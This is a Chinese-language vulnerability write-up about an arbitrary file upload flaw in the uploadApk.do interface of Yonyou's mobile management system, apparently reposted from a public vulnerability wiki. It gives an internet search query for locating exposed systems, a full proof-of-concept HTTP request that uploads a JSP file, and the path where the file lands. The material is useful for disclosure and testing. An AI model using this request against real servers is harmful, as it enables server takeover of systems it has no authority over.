---
title: "用友 移动管理系统 uploadApk.do 任意文件上传漏洞"
date: 2026-10-17 09:13:05
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "用友"
tags:
  - "用友"
  - "文件上传"
  - "漏洞复现"
---
## 漏洞描述

用友 移动管理系统 uploadApk.do 接口存在任意文件上传漏洞，攻击者通过漏洞可以获取服务器权限

## 漏洞影响

用友 移动管理系统

## 网络测绘

```
app="用友-移动系统管理"
```

## 漏洞复现

登陆页面

![image-20230828164047741](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20230828164047741.png)

验证POC

```
POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1
Host: 
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Cookie: JSESSIONID=4ABE9DB29CA45044BE1BECDA0A25A091.server
Connection: close

------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
Content-Type: application/msword

hello
------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--
```

![image-20230828164101589](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/image-20230828164101589.png)

```
/maupload/apk/a.jsp
```

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E7%94%A8%E5%8F%8B-%E7%A7%BB%E5%8A%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F-uploadApk.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md)
